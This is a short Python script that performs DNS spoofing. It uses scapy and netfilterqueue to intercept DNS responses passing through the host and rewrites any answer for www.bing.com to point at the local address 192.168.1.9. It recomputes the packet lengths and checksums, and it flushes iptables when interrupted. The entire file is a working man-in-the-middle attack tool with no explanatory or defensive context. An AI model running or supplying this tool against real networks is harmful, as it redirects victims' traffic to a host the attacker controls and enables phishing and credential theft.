#!/usr/bin/python3
import subprocess
import scapy.all as scapy
import netfilterqueue

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.bing.com' in str(qname):
            print('[+] Spoofing Target')
            answer = scapy.DNSRR(rrname=qname, rdata='192.168.1.9')
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))
    packet.accept()
queue = netfilterqueue.NetfilterQueue()
try:
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print('\nFlush The iptables...')
    subprocess.call(['sudo', 'iptables', '--flush'])
    print('Done!')
